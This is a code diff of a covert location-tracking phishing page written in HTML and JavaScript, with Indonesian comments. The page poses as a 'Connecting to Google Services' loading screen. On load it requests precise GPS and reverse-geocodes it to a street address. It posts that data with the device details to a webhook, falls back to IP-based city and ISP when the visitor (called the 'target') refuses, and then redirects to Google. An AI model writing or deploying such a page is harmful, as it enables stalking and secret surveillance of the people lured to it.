@@ -1,57 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Sistem Sedang Memuat...</title>
-    <style>body{background:#000;color:#222;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connecting to Google Services...</title>
+    <style>
+        body { background: #000; color: #444; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 2px solid #111; border-top: 2px solid #4285F4; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <div style="border:2px solid #111;border-top:2px solid #333;border-radius:50%;width:20px;height:20px;animation:s 1s linear infinite"></div>
-    <style>@keyframes s{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
+    <div class="loader"></div>
 
 <script>
     const webhook = "https://webhook.site/3c903d72-6b38-4d96-a901-286e3fc578b2";
 
-    async function sendLog(data) {
+    async function sendToWebhook(data) {
         await fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
         navigator.sendBeacon(webhook, JSON.stringify(data));
     }
 
-    function capture() {
-        // Ambil data GPS (Akurasi Tinggi)
+    async function startTracking() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
-                const acc = pos.coords.accuracy;
 
-                // Data lengkap dengan koordinat GPS asli
-                const report = {
-                    tipe: "GPS_PRESISI_TINGGI",
-                    maps: `https://www.google.com/maps?q=${lat},${lon}`,
-                    akurasi_meter: acc,
-                    detail: `Koordinat: ${lat}, ${lon}`,
-                    device: navigator.userAgent
-                };
+                try {
+                    // Menerjemahkan koordinat jadi NAMA JALAN & KAMPUNG
+                    const geoReq = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                    const geo = await geoReq.json();
+                    const alamat = geo.display_name;
+
+                    const report = {
+                        status: "BERHASIL_LACAK_PRESISI",
+                        alamat_lengkap: alamat, // <-- INI DIA NAMA JALANNYA
+                        titik_maps: `https://www.google.com/maps?q=${lat},${lon}`,
+                        akurasi: pos.coords.accuracy + " meter",
+                        device: navigator.userAgent
+                    };
+
+                    await sendToWebhook(report);
+                } catch (err) {
+                    // Jika gagal ambil nama jalan, kirim koordinat mentah saja
+                    await sendToWebhook({ status: "HANYA_KOORDINAT", lat, lon });
+                }
                 
-                await sendLog(report);
+                // Lempar ke Google
                 window.location.href = "https://www.google.com";
 
             }, async (err) => {
-                // Jika target klik "TOLAK", ambil data IP sebagai cadangan
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                const fallback = {
-                    tipe: "CADANGAN_IP_ONLY (Target Menolak GPS)",
+                // Jika target TOLAK akses lokasi (Hanya dapet info Kota dari IP)
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const d = await ipRes.json();
+                
+                await sendToWebhook({
+                    status: "TARGET_MENOLAK_GPS (IP_ONLY)",
                     kota: d.city,
-                    maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
-                };
-                await sendLog(fallback);
+                    isp: d.org,
+                    maps_perkiraan: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
+                });
+                
                 window.location.href = "https://www.google.com";
-            }, { enableHighAccuracy: true });
+            }, { enableHighAccuracy: true, timeout: 5000 });
         }
     }
 
-    window.onload = capture;
+    window.onload = startTracking;
 </script>
 </body>
 </html>
